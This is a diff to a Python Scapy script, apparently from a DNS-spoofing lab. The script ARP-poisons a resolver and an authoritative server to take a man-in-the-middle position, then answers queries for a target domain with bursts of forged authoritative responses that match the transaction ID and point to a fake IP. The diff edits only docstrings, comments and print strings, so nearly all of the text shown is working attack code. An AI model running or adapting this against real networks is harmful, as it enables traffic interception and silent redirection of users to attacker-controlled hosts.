@@ -82,8 +82,8 @@ def set_drop_rule(enabled):
 def resolve_mac(ip):
     """Resolve the MAC address for a given IP via ARP.
 
-    Input:  ip  - str, target IPv4 address
-    Output: str - MAC address string (e.g. "aa:bb:cc:dd:ee:ff"), or None on failure
+    Input:  ip
+    Output: str - MAC address string or None on failure
     """
     ans = srp1(
         Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
@@ -98,7 +98,7 @@ def resolve_mac(ip):
 def poison_once():
     """Send one round of gratuitous ARP replies to position attacker as MITM.
 
-    Tells the resolver that AUTH_SERVER_IP maps to our MAC, and tells the
+    We tell the resolver that AUTH_SERVER_IP maps to our MAC, and that the
     authoritative server that RESOLVER_IP maps to our MAC.  Both sides then
     forward traffic through us.
 
@@ -116,16 +116,8 @@ def poison_once():
         verbose=0,
     )
 
-
+#### Restore correct ARP mappings for both resolver and authoritative server.
 def restore_arp():
-    """Restore correct ARP mappings for both resolver and authoritative server.
-
-    Broadcasts the real MAC <-> IP bindings so the network returns to normal
-    after the attack.  Called automatically at exit via atexit.
-
-    Input:  None
-    Output: None (sends ARP packets)
-    """
     if not resolver_mac or not auth_mac:
         return
     sendp(
@@ -143,10 +135,7 @@ def restore_arp():
 def poison_loop():
     """Continuously refresh ARP poison at POISON_INTERVAL until stopped.
 
-    Runs in a background daemon thread so ARP caches don't expire mid-attack.
-
-    Input:  None
-    Output: None (infinite loop until global `running` is False)
+    I run it in the background with daemon thread so ARP caches don't expire mid-attack.
     """
     while running:
         poison_once()
@@ -155,23 +144,18 @@ def poison_loop():
 
 def stop_handler(signum, frame):
     """Signal handler for SIGINT/SIGTERM - signals the main loop to stop.
-
-    Input:  signum - int, signal number
-            frame  - current stack frame (unused)
-    Output: None (sets global `running = False`)
     """
     del signum, frame
     global running
     running = False
-#################### DO NOT TOUCH ####################
 
 
 def spoof_dns(pkt):
     """Callback invoked for every DNS query intercepted between resolver and authoritative.
 
-    Checks whether the query is for TARGET_DOMAIN.  If so, crafts a forged DNS
+    I Check whether the query is for TARGET_DOMAIN.  If so, i craft a forged DNS
     response that matches the intercepted query's Transaction ID and source port,
-    but returns FAKE_IP as the answer.  Sends a burst of 64 copies to race any
+    but returns FAKE_IP as the answer, then i Send a burst of 64 copies to race any
     delayed legitimate reply.
 
     The forged packet fields that must match the resolver's expectation:
@@ -182,9 +166,6 @@ def spoof_dns(pkt):
         - DNS id  : pkt[DNS].id     (Transaction ID from the intercepted query)
         - DNS qr  : 1               (this is a response, not a query)
         - DNS aa  : 1               (claim to be authoritative)
-
-    Input:  pkt - Scapy packet captured by sniff()
-    Output: None (sends forged DNS packets via sendp)
     """
     if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS) and pkt[DNS].qd):
         return
@@ -193,12 +174,6 @@ def spoof_dns(pkt):
     qname = pkt[DNS].qd.qname.decode(errors="replace").rstrip(".").lower()
 
     if pkt[IP].src == RESOLVER_IP and pkt[IP].dst == AUTH_SERVER_IP and qname == TARGET_DOMAIN.lower():
-
-        # Craft a forged DNS response:
-        #   - Ether: deliver directly to resolver's MAC (we are in MITM position)
-        #   - IP:    pretend to originate from the authoritative server
-        #   - UDP:   sport=53 (auth server port), dport=33333 (resolver's fixed port)
-        #   - DNS:   mirror the TX ID; single A record pointing to FAKE_IP
         forged = (
             Ether(dst=resolver_mac)
             / IP(src=AUTH_SERVER_IP, dst=RESOLVER_IP)
@@ -225,7 +200,7 @@ def spoof_dns(pkt):
         # Send a larger L2 burst so spoofed packets arrive before resolver retries.
         sendp([forged] * 64, verbose=0)
 
-        print(f"[+] Sent forged response burst for {TARGET_DOMAIN} -> {FAKE_IP}")
+        print(f"Sent forged response burst for {TARGET_DOMAIN} -> {FAKE_IP}")
 
 if __name__ == "__main__":
     print("[*] Resolving target MAC addresses...")
@@ -236,8 +211,8 @@ if __name__ == "__main__":
         print("[!] Could not resolve resolver/authoritative MAC addresses.")
         sys.exit(1)
 
-    print(f"[*] Resolver MAC: {resolver_mac}")
-    print(f"[*] Authoritative MAC: {auth_mac}")
+    print(f" Resolver MAC: {resolver_mac}")
+    print(f" Authoritative MAC: {auth_mac}")
 
     set_ip_forward(True)
     set_drop_rule(True)
@@ -250,7 +225,7 @@ if __name__ == "__main__":
     poisoner = threading.Thread(target=poison_loop, daemon=True)
     poisoner.start()
 
-    print(f"[*] MITM active. Sniffing DNS queries {RESOLVER_IP} -> {AUTH_SERVER_IP}...")
+    print(f"MITM active. Sniffing DNS queries {RESOLVER_IP} -> {AUTH_SERVER_IP}...")
     sniff(
         filter=f"udp and src host {RESOLVER_IP} and dst host {AUTH_SERVER_IP} and dst port 53",
         prn=spoof_dns,
